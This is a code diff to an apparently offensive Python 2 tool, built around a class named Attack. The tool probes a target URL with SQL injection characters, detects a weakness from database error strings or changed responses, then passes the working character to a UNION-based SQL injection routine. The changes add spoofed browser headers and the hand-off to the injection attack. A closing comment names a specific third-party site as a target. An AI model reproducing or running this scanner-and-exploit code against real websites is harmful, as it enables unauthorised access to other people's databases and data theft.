@@ -3,11 +3,11 @@ try:
     import src.libs as lib
     from src.Colors import TextColor
     from injection_defines import *
+    from UnionBase import UnionBaseAttack
+    from Config.WebConfig import define_headerdata
 except Exception as err:
-    raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s"%(err)) + TextColor.WHITE
-
-define_data = {"user-agent":"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) " + \
-                            "AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"}
+    raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s"%(err)) \
+                      + TextColor.WHITE
 
 class Attack(object):
     def __init__(self, url):
@@ -19,21 +19,40 @@ class Attack(object):
         global define_data
         print
 
-        firstResponse = lib.requests.get(url=self.url, params=define_data)
+        firstResponse = lib.requests.get(url=self.url, headers=define_headerdata)
 
+        injectedChar = ""
+        was_Vulnrable = False
+
+        '''
+            we check all bypass and attacks until to knowing that this site has sql injection vulnarabilities or not
+            if we find vulnrabilities so we break <for> statement and start to inject sql command
+        '''
         for item in define_injections_chars:
             lib.sys.stdout.write(TextColor.CYAN + str('[%s]'%(self.url + str(item))) + TextColor.WHITE)
-            resposne = lib.requests.get(url=self.url + str(item), params=define_data)
+            resposne = lib.requests.get(url=self.url + str(item), headers=define_headerdata)
             lib.sleep(.5)
             if resposne.content.find(define_error_list[0]) is not -1 \
                     or resposne.content.find(define_error_list[1]) is not -1 \
                     or resposne.content.find(define_error_list[2]) is not -1 \
                     or resposne.content.find(define_error_list[3]) is not -1:
                 print TextColor.RED + " => find vulnrability"
+                was_Vulnrable = True
+                injectedChar = item
+                break
             elif resposne.content != firstResponse.content:
                 print TextColor.RED + " => find vulnrability"
+                was_Vulnrable = True
+                injectedChar = item
+                break
+            #todo: check blind base attacks
             else:
                 print TextColor.GREEN + " => clear"
+
+        if url != "" and was_Vulnrable == True:
+            UnionBaseAttack(self.url, injectedChar)
+            #todo = check this
+
 
 #todo: this script must recognize the kindof database that target used
 #todo: target = http://tncgroup.pk/content.php?Id=2 => show error
